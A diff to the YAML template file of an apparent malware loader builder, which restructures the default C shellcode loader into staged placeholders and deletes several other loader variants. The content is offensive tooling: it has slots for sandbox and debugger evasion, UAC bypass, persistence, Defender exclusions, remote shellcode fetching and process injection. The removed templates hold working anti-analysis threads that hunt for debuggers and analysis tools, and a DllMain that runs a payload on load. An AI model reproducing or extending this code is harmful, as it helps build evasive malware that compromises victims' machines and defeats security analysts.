@@ -2500,7 +2500,7 @@ sections:
 templates:
 - id: default
   display: Default Loader
-  description: Full-featured loader with all protection placeholders.
+  description: Full-featured loader with every playbook section wired up. The only template - swap snippets per section to tune behavior.
   content: |
     #define WIN32_LEAN_AND_MEAN
     #include <windows.h>
@@ -2521,32 +2521,30 @@ templates:
 
     INT main(VOID)
     {
-        {{SHELLCODE_SOURCE}}
-
-        {{SHELLCODE_URL}}
-
+        // Stage 1 - environment probing (cheap, runs first so bail-outs are fast).
         {{ANTI_EMULATION}}
-
+        {{ANTI_SANDBOX}}
         {{GUARDRAILS}}
 
-        {{ANTI_SANDBOX}}
-
+        // Stage 2 - debugger / analyst countermeasures.
         {{ANTI_DEBUGGING}}
+        {{ANTI_ANALYSIS}}
 
+        // Stage 3 - misdirection.
         {{DECOY}}
 
+        // Stage 4 - elevation, install, persistence wiring.
         {{UAC_BYPASS}}
-
         {{INSTALLATION}}
-
         {{BACKDOOR_CONFIG}}
-
         {{PERSISTENCE}}
-
         {{EVASION}}
 
-        {{PROCESS_INJECTION}}
+        // Stage 5 - load & deliver payload.
+        {{SHELLCODE_SOURCE}}
+        {{SHELLCODE_URL}}
 
+        {{PROCESS_INJECTION}}
         {{SHELLCODE_EXECUTION}}
 
         Sleep(1);
@@ -2564,15 +2562,18 @@ templates:
   - name: ANTI_EMULATION
     kind: snippet
     snippetTemplate: antiemulation
-  - name: GUARDRAILS
-    kind: snippet
-    snippetTemplate: guardrail
   - name: ANTI_SANDBOX
     kind: snippet
     snippetTemplate: antisandbox
+  - name: GUARDRAILS
+    kind: snippet
+    snippetTemplate: guardrail
   - name: ANTI_DEBUGGING
     kind: snippet
     snippetTemplate: antidebugging
+  - name: ANTI_ANALYSIS
+    kind: snippet
+    snippetTemplate: antianalysis
   - name: DECOY
     kind: snippet
     snippetTemplate: decoy
@@ -2594,389 +2595,6 @@ templates:
   - name: PROCESS_INJECTION
     kind: snippet
     snippetTemplate: psinjection
-  - name: SHELLCODE_EXECUTION
-    kind: snippet
-    snippetTemplate: shellcodeexecution
-- id: paranoid
-  display: Paranoid Loader
-  description: Every protection enabled - layered defense in depth.
-  content: "#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <winternl.h>\n#include <intrin.h>\n#include <tlhelp32.h>\n#include <shlobj.h>\n#include <iphlpapi.h>\n#include <lm.h>\n#pragma comment(lib, \"iphlpapi.lib\")\n#pragma comment(lib, \"netapi32.lib\")\n\n{{PREAMBLE}}\n\n{{PROCESS_LOOKUP_HELPER}}\n\n// Watchdog thread\nvolatile BOOL g_SafeToRun = TRUE;\n\nDWORD WINAPI WatchdogThread(LPVOID lpParam) {\n    while (g_SafeToRun) {\n        // Check debugger continuously\n        if (IsDebuggerPresent()) { g_SafeToRun = FALSE; ExitProcess(0); }\n        \n        // Check hardware breakpoints\n        CONTEXT ctx = {0};\n        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n        if (GetThreadContext(GetCurrentThread(), &ctx)) {\n            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { g_SafeToRun = FALSE; ExitProcess(0); }\n        }\n        \n        // Check for analysis tools\n        const wchar_t* tools[] = {\n            L\"x64dbg.exe\", L\"ida.exe\", L\"idaq64.exe\", L\"procmon.exe\",\n            L\"wireshark.exe\", L\"fiddler.exe\", L\"ProcessHacker.exe\"\n        };\n        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n        if (snap != INVALID_HANDLE_VALUE) {\n            PROCESSENTRY32W pe = {sizeof(pe)};\n            if (Process32FirstW(snap, &pe)) {\n                do {\n                    for (int i = 0; i < 7; i++) {\n                        if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {\n                            CloseHandle(snap);\n                            g_SafeToRun = FALSE;\n                            ExitProcess(0);\n                        }\n                    }\n                } while (Process32NextW(snap, &pe));\n            }\n            CloseHandle(snap);\n        }\n        \n        Sleep(500);\n    }\n    return 0;\n}\n\nINT main(VOID)\n{\n    // Start watchdog\n    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);\n\n    // Phase 1: Anti-Emulation\n    {{ANTI_EMULATION}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 2: Environment Validation\n    {{GUARDRAILS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 3: VM/Sandbox Detection\n    {{ANTI_SANDBOX}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 4: Anti-Debugging\n    {{ANTI_DEBUGGING}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 5: Anti-Analysis\n    {{ANTI_ANALYSIS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 6: UAC bypass\n    {{UAC_BYPASS}}\n\n    // Phase 6b: Installation\n    {{INSTALLATION}}\n\n    // Phase 6c: Backdoor Config\n    {{BACKDOOR_CONFIG}}\n\n    // Phase 7: Persistence\n    {{PERSISTENCE}}\n\n    // Phase 8: Evasion (Defender exclusions, etc.)\n    {{EVASION}}\n\n    // Phase 9: Load Payload\n    {{SHELLCODE_SOURCE}}\n    {{SHELLCODE_URL}}\n\n    // Phase 10: Execute\n    {{SHELLCODE_EXECUTION}}\n\n    return 0;\n}\n"
-  placeholders:
-  - name: PREAMBLE
-    kind: system
-  - name: PROCESS_LOOKUP_HELPER
-    kind: system
-  - name: ANTI_EMULATION
-    kind: snippet
-    snippetTemplate: antiemulation
-  - name: GUARDRAILS
-    kind: snippet
-    snippetTemplate: guardrail
-  - name: ANTI_SANDBOX
-    kind: snippet
-    snippetTemplate: antisandbox
-  - name: ANTI_DEBUGGING
-    kind: snippet
-    snippetTemplate: antidebugging
-  - name: ANTI_ANALYSIS
-    kind: snippet
-    snippetTemplate: antianalysis
-  - name: UAC_BYPASS
-    kind: snippet
-    snippetTemplate: uacb
-  - name: INSTALLATION
-    kind: snippet
-    snippetTemplate: installation
-  - name: BACKDOOR_CONFIG
-    kind: snippet
-    snippetTemplate: backdoorconfig
-  - name: PERSISTENCE
-    kind: snippet
-    snippetTemplate: persistence
-  - name: EVASION
-    kind: snippet
-    snippetTemplate: evasion
-  - name: SHELLCODE_SOURCE
-    kind: system
-  - name: SHELLCODE_URL
-    kind: system
-  - name: SHELLCODE_EXECUTION
-    kind: snippet
-    snippetTemplate: shellcodeexecution
-- id: aggressive
-  display: Aggressive Loader
-  description: Heavy anti-analysis and active debugger countermeasures.
-  content: |
-    #define WIN32_LEAN_AND_MEAN
-    #include <windows.h>
-    #include <winternl.h>
-    #include <intrin.h>
-    #include <tlhelp32.h>
-    #include <shlobj.h>
-    #include <shellapi.h>
-    #include <iphlpapi.h>
-    #include <lm.h>
-    #pragma comment(lib, "iphlpapi.lib")
-    #pragma comment(lib, "netapi32.lib")
-    #pragma comment(lib, "shell32.lib")
-
-    {{PREAMBLE}}
-
-    {{PROCESS_LOOKUP_HELPER}}
-
-    // Self-protection thread
-    DWORD WINAPI AntiAnalysisThread(LPVOID lpParam) {
-        while (TRUE) {
-
-            // Continuous debugger check
-            if (IsDebuggerPresent()) ExitProcess(0);
-
-            // Check for debugging tools
-            const wchar_t* tools[] = {L"x64dbg.exe", L"ida.exe", L"procmon.exe", L"wireshark.exe"};
-            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-            if (snap != INVALID_HANDLE_VALUE) {
-                PROCESSENTRY32W pe = {sizeof(pe)};
-                if (Process32FirstW(snap, &pe)) {
-                    do {
-                        for (int i = 0; i < 4; i++) {
-                            if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {
-                                CloseHandle(snap);
-                                ExitProcess(0);
-                            }
-                        }
-                    } while (Process32NextW(snap, &pe));
-                }
-                CloseHandle(snap);
-            }
-            Sleep(1000);
-        }
-        return 0;
-    }
-
-    INT main(VOID)
-    {
-        // Start continuous monitoring
-        CreateThread(NULL, 0, AntiAnalysisThread, NULL, 0, NULL);
-        {{ANTI_EMULATION}}
-        {{ANTI_ANALYSIS}}
-        {{ANTI_DEBUGGING}}
-        {{UAC_BYPASS}}
-        {{INSTALLATION}}
-        {{BACKDOOR_CONFIG}}
-        {{PERSISTENCE}}
-        {{EVASION}}
-        {{SHELLCODE_SOURCE}}
-        {{SHELLCODE_URL}}
-        {{SHELLCODE_EXECUTION}}
-        return 0;
-    }
-  placeholders:
-  - name: PREAMBLE
-    kind: system
-  - name: PROCESS_LOOKUP_HELPER
-    kind: system
-  - name: ANTI_EMULATION
-    kind: snippet
-    snippetTemplate: antiemulation
-  - name: ANTI_ANALYSIS
-    kind: snippet
-    snippetTemplate: antianalysis
-  - name: ANTI_DEBUGGING
-    kind: snippet
-    snippetTemplate: antidebugging
-  - name: UAC_BYPASS
-    kind: snippet
-    snippetTemplate: uacb
-  - name: INSTALLATION
-    kind: snippet
-    snippetTemplate: installation
-  - name: BACKDOOR_CONFIG
-    kind: snippet
-    snippetTemplate: backdoorconfig
-  - name: PERSISTENCE
-    kind: snippet
-    snippetTemplate: persistence
-  - name: EVASION
-    kind: snippet
-    snippetTemplate: evasion
-  - name: SHELLCODE_SOURCE
-    kind: system
-  - name: SHELLCODE_URL
-    kind: system
-  - name: SHELLCODE_EXECUTION
-    kind: snippet
-    snippetTemplate: shellcodeexecution
-- id: stealth
-  display: Stealth Loader
-  description: Maximum evasion with layered protection.
-  content: |
-    #define WIN32_LEAN_AND_MEAN
-    #include <windows.h>
-    #include <winternl.h>
-    #include <intrin.h>
-    #include <tlhelp32.h>
-    #include <shlobj.h>
-    #include <shellapi.h>
-    #include <iphlpapi.h>
-    #include <lm.h>
-    #pragma comment(lib, "iphlpapi.lib")
-    #pragma comment(lib, "netapi32.lib")
-    #pragma comment(lib, "shell32.lib")
-
-    {{PREAMBLE}}
-
-    {{PROCESS_LOOKUP_HELPER}}
-
-    INT main(VOID)
-    {
-        // Layer 1: Anti-Emulation
-        {{ANTI_EMULATION}}
-
-        // Layer 2: Sandbox/VM Detection
-        {{ANTI_SANDBOX}}
-
-        // Layer 3: Environment Validation
-        {{GUARDRAILS}}
-
-        // Layer 4: Debugger Detection
-        {{ANTI_DEBUGGING}}
-
-        // Layer 5: UAC bypass
-        {{UAC_BYPASS}}
-
-        // Layer 6: Installation
-        {{INSTALLATION}}
-
-        // Layer 6b: Backdoor Config
-        {{BACKDOOR_CONFIG}}
-
-        // Layer 7: Persistence
-        {{PERSISTENCE}}
-
-        // Layer 8: Evasion (Defender exclusions, etc.)
-        {{EVASION}}
-
-        // Layer 8: Payload
-        {{SHELLCODE_SOURCE}}
-        {{SHELLCODE_URL}}
-
-        // Layer 9: Execution
-        {{SHELLCODE_EXECUTION}}
-
-        return 0;
-    }
-  placeholders:
-  - name: PREAMBLE
-    kind: system
-  - name: PROCESS_LOOKUP_HELPER
-    kind: system
-  - name: ANTI_EMULATION
-    kind: snippet
-    snippetTemplate: antiemulation
-  - name: ANTI_SANDBOX
-    kind: snippet
-    snippetTemplate: antisandbox
-  - name: GUARDRAILS
-    kind: snippet
-    snippetTemplate: guardrail
-  - name: ANTI_DEBUGGING
-    kind: snippet
-    snippetTemplate: antidebugging
-  - name: UAC_BYPASS
-    kind: snippet
-    snippetTemplate: uacb
-  - name: INSTALLATION
-    kind: snippet
-    snippetTemplate: installation
-  - name: BACKDOOR_CONFIG
-    kind: snippet
-    snippetTemplate: backdoorconfig
-  - name: PERSISTENCE
-    kind: snippet
-    snippetTemplate: persistence
-  - name: EVASION
-    kind: snippet
-    snippetTemplate: evasion
-  - name: SHELLCODE_SOURCE
-    kind: system
-  - name: SHELLCODE_URL
-    kind: system
-  - name: SHELLCODE_EXECUTION
-    kind: snippet
-    snippetTemplate: shellcodeexecution
-- id: minimal
-  display: Shellcode Minimal
-  description: Minimal loader - only shellcode setup and execution.
-  content: |
-    #define WIN32_LEAN_AND_MEAN
-    #include <windows.h>
-    #include <winternl.h>
-
-    {{PREAMBLE}}
-
-    INT main(VOID)
-    {
-        {{SHELLCODE_SOURCE}}
-
-        {{INSTALLATION}}
-
-        {{BACKDOOR_CONFIG}}
-
-        {{PERSISTENCE}}
-
-        {{SHELLCODE_EXECUTION}}
-
-        return 0;
-    }
-
-  placeholders:
-  - name: PREAMBLE
-    kind: system
-  - name: SHELLCODE_SOURCE
-    kind: system
-  - name: INSTALLATION
-    kind: snippet
-    snippetTemplate: installation
-  - name: BACKDOOR_CONFIG
-    kind: snippet
-    snippetTemplate: backdoorconfig
-  - name: PERSISTENCE
-    kind: snippet
-    snippetTemplate: persistence
-  - name: SHELLCODE_EXECUTION
-    kind: snippet
-    snippetTemplate: shellcodeexecution
-- id: minimal-dll
-  display: Minimal DLL
-  description: Minimal DLL with DllMain entry.
-  content: |
-    #define WIN32_LEAN_AND_MEAN
-    #include <windows.h>
-    #include <winternl.h>
-
-    {{PREAMBLE}}
-
-    {{SHELLCODE_SOURCE}}
-
-    INT ExecutePayload()
-    {
-        {{INSTALLATION}}
-
-        {{BACKDOOR_CONFIG}}
-
-        {{PERSISTENCE}}
-
-        {{SHELLCODE_EXECUTION}}
-        return 0;
-    }
-
-    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-        switch (fdwReason) {
-            case DLL_PROCESS_ATTACH:
-                ExecutePayload();
-                break;
-        }
-        return TRUE;
-    }
-  placeholders:
-  - name: PREAMBLE
-    kind: system
-  - name: SHELLCODE_SOURCE
-    kind: system
-  - name: INSTALLATION
-    kind: snippet
-    snippetTemplate: installation
-  - name: BACKDOOR_CONFIG
-    kind: snippet
-    snippetTemplate: backdoorconfig
-  - name: PERSISTENCE
-    kind: snippet
-    snippetTemplate: persistence
-  - name: SHELLCODE_EXECUTION
-    kind: snippet
-    snippetTemplate: shellcodeexecution
-- id: sgncarrier
-  display: SGN Carrier
-  description: Minimal carrier that wraps an SGN-encoded .bin into a runnable executable. Reuses the selected shellcode execution method.
-  content: |
-    // SGN carrier - wraps a Shikata Ga Nai-encoded blob into a runnable PE.
-    // The SGN decoder stub is self-modifying and requires writable+executable
-    // memory at execution; the chosen execution snippet must allocate RWX
-    // (or perform RW->RWX, not RW->RX) for the decoder to run correctly.
-    #define WIN32_LEAN_AND_MEAN
-    #include <windows.h>
-    #include <winternl.h>
-
-    {{PREAMBLE}}
-
-    INT main(VOID)
-    {
-        {{SHELLCODE_SOURCE}}
-
-        {{INSTALLATION}}
-
-        {{BACKDOOR_CONFIG}}
-
-        {{PERSISTENCE}}
-
-        {{SHELLCODE_EXECUTION}}
-
-        return 0;
-    }
-  placeholders:
-  - name: PREAMBLE
-    kind: system
-  - name: SHELLCODE_SOURCE
-    kind: system
-  - name: INSTALLATION
-    kind: snippet
-    snippetTemplate: installation
-  - name: BACKDOOR_CONFIG
-    kind: snippet
-    snippetTemplate: backdoorconfig
-  - name: PERSISTENCE
-    kind: snippet
-    snippetTemplate: persistence
   - name: SHELLCODE_EXECUTION
     kind: snippet
     snippetTemplate: shellcodeexecution
